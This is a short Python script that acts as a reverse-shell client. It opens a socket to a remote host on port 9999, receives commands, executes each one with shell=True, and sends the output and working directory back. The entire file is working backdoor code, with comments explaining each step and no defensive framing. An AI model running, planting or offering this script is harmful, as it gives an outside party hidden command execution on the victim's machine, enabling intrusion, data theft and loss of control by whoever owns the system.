import os
import socket
import subprocess

s = socket.socket()
host = ''
port = 9999
s.connect((host, port))

# While server is keeping the connection loop

while True:

    data = s.recv(1024)
    # If data equals cd command
    if data[:2].decode("utf-8") == 'cd':
        # Handle dir changes
        os.chdir(data[3:].decode("utf-8"))
    # Check if there is any data
    if len(data) > 0:
        # Run command like in local cmd and output as string
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # Output cmd's output in bytes to transfer over network
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        # Also take string version for display
        output_str = str(output_bytes, "utf-8")
        # Send output of client's current working directory
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))

# Close connection
s.close()
